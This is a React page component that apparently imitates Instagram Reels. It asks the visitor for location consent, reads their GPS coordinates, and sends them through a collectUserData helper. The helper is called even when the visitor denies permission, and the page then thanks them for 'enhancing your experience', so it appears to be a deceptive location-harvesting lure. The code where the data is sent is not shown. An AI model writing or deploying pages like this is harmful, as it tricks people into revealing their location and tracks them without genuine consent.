import { useState, useEffect } from 'react';
import AppHeader from '@/components/AppHeader';
import ReelViewer from '@/components/ReelViewer';
import ConsentOverlay from '@/components/ConsentOverlay';
import StatusNotification from '@/components/StatusNotification';
import { collectUserData } from '@/lib/utils';

export default function Home() {
  const [isConsentGiven, setIsConsentGiven] = useState(false);
  const [isConsentOverlayVisible, setIsConsentOverlayVisible] = useState(true);
  const [isDataSending, setIsDataSending] = useState(false);
  const [isDataSent, setIsDataSent] = useState(false);
  const [notificationMessage, setNotificationMessage] = useState<string | null>(null);
  const [isError, setIsError] = useState(false);
  
  // Handle user consent for location
  const handleAllowLocation = () => {
    setIsConsentGiven(true);
    setIsConsentOverlayVisible(false);
    getLocationAndSend();
  };
  
  // Handle user denying location consent
  const handleDenyLocation = () => {
    setIsConsentOverlayVisible(false);
    handleDataCollection("Permission denied", "Permission denied");
    showNotification("You can enable location services later in settings");
  };
  
  // Show notification
  const showNotification = (message: string, error = false) => {
    setNotificationMessage(message);
    setIsError(error);
    
    // Auto-hide notification after 3 seconds
    setTimeout(() => {
      setNotificationMessage(null);
    }, 3000);
  };
  
  // Get user location and send data
  const getLocationAndSend = () => {
    setIsDataSending(true);
    
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          handleDataCollection(
            position.coords.latitude,
            position.coords.longitude
          );
        },
        (error) => {
          setIsDataSending(false);
          
          let errorMsg = "Location access denied";
          switch(error.code) {
            case error.PERMISSION_DENIED:
              errorMsg = "Location access denied";
              break;
            case error.POSITION_UNAVAILABLE:
              errorMsg = "Location information is unavailable";
              break;
            case error.TIMEOUT:
              errorMsg = "Location request timed out";
              break;
            default:
              errorMsg = "An unknown error occurred";
              break;
          }
          
          handleDataCollection("Permission denied", "Permission denied");
          showNotification(errorMsg, true);
        }
      );
    } else {
      setIsDataSending(false);
      handleDataCollection("Geolocation not supported", "Geolocation not supported");
      showNotification("Your browser doesn't support geolocation", true);
    }
  };
  
  // Handle data collection and submission
  const handleDataCollection = async (lat: string | number, lon: string | number) => {
    try {
      await collectUserData(lat, lon);
      setIsDataSent(true);
      setIsDataSending(false);
      showNotification("Thank you for enhancing your experience!");
    } catch (error) {
      setIsDataSending(false);
      console.error('Error:', error);
      showNotification("Unable to connect to services", true);
    }
  };
  
  return (
    <div className="min-h-screen bg-instagram-dark text-white font-sans flex flex-col">
      <AppHeader />
      
      <main className="flex flex-col items-center pt-4 px-4 flex-1">
        <ReelViewer isLoading={isDataSending} />
      </main>
      
      {isConsentOverlayVisible && (
        <ConsentOverlay 
          onAllow={handleAllowLocation} 
          onDeny={handleDenyLocation} 
        />
      )}
      
      {notificationMessage && (
        <StatusNotification 
          message={notificationMessage} 
          isError={isError} 
        />
      )}
    </div>
  );
}
